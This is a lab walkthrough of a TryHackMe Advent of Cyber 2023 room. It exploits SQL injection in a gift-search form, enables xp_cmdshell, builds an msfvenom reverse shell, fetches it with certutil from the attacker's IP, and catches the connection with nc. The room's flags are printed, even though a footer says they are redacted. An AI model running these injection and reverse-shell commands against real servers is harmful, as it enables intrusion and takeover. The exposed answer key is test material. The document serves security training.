# Advent of Cyber 2023 - Day 10: Inject the Halls with EXEC Queries

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Overview & Investigation Walkthrough

In this task we are looking into the defaced website and try to hack back into the server using SQL injection techniques.

1. Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?

   When looking through the website, we can see there is a gift search page. Clicking the link, we can see the url for this form.

   ![Gift Search](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Search.png)

   ><details><summary>Click for answer</summary>/giftsearch.php</details>

2. Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?

   After submitting a search query, we can see what paramters is used in the url.

   ![Gift Url](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Url.png)

   To check for any vulnerablities we can simply enter `'` for the first parameter.

   ![Error](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Error.png)

   This does indeed gives us an error. It also gives us some sensitive information.

   ><details><summary>Click for answer</summary>ODBC Driver 17 for SQL Server</details>

3. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?

   Lets append the `1=1` condition to our injection. Dont' forget to use `--` at the end. This makes sure the rest of the query is ignored.

   ```cmd
   ' OR 1=1 --
   ```

   ![Flag 1](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Flag_1.png)

   Scrolling all the way to the bottom gives us the answer we are looking for.

   ><details><summary>Click for answer</summary>THM{a4ffc901c27fb89efe3c31642ece4447}</details>

4. What flag is in the note file Gr33dstr left behind on the system?

   To get access to the underlying file system, we need to perform several steps.

   First we must enable `xp_cmdshell` as this will enable us to execute commands on the filesystem. We can do this by injection this command using SQL injection:
   
   ```cmd
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
   ```

   ![Enable Xpcmd](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Enable_Xpcmd.png)

   The next thing to do is prepare our reverse shell using msfvenom.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o gift.exe
   ```

   ![Shell](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Shell.png)
   
   Using `xp_cmdshell` and `certutil` we can transfer this file to the server using the SQL injection we just found.

   First, setup a python server in the same folder as our shell using `python3 -m http.server 8080`.

   Then use this injection in the gift search url.
   
   ```cmd
   '; EXEC xp_cmdshell 'certutil -urlcache -f http://10.18.78.136:8080/gift.exe C:\Windows\Temp\gift.exe';--
   ```

   ##
   **Unfortunately, I am getting errors when trying to transfer the file. Although it seems to send a request to the python server, executing the file doesn't seem to give me a connection.**
   ##
   
   ![Gift Upload Error](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Upload_Error.png)

   I had to use the attack box instead to upload the shell. This did work without any errors.

   ![Gift Upload](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Upload.png)

   I wanted to see if only the transfer of the file was problematic. So I setup a listener on my kali box using:

   ```cmd
   nc -nlvp 1337
   ```

   I re-created the shell on the attack box using the IP and port for my kali box uploaded it and executed the file from the server using:

   ```cmd
   '; EXEC xp_cmdshell 'C:\Windows\Temp\gift.exe';--
   ```

   ![Shell Connection](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Shell_Connection.png)

   Success! We see we are indeed logged into the system. We can now start looking for the Note in the Administrator folder.

   ![Note Search](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Note_Search.png)
   
   Looks like the note is located in the Desktop folder. Opening it, we see it is a note from Gr33dstr with a flag.

   ![Note Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Note_Flag.png)

   ><details><summary>Click for answer</summary>THM{b06674fedd8dfc28ca75176d3d51409e}</details>

5. What is the flag you receive on the homepage after restoring the website?

   The final step is the restore the original website and retrieve our flag.

   ![Files](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Files.png)
   
   In the Admin folder there is another file called `restore_website.bat`, this is probably what we are looking for judging from its content. Lets run it!

   ```cmd
   restore_website.bat
   ```

   ![Restore Script](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Restore_Script.png)

   Now we simply refresh the webpage and we should be greeted with our final flag.

   ![Restore Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Restore_Flag.png)

   ><details><summary>Click for answer</summary>THM{4cbc043631e322450bc55b42c}</details>

If you enjoyed this task, feel free to check out the [Software Security](https://tryhackme.com/module/software-security) module.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature? | `/giftsearch.php` |
| Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website? | `ODBC Driver 17 for SQL Server` |
| Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database? | `flag{hidden}` |
| What flag is in the note file Gr33dstr left behind on the system? | `flag{hidden}` |
| What is the flag you receive on the homepage after restoring the website? | `flag{hidden}` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
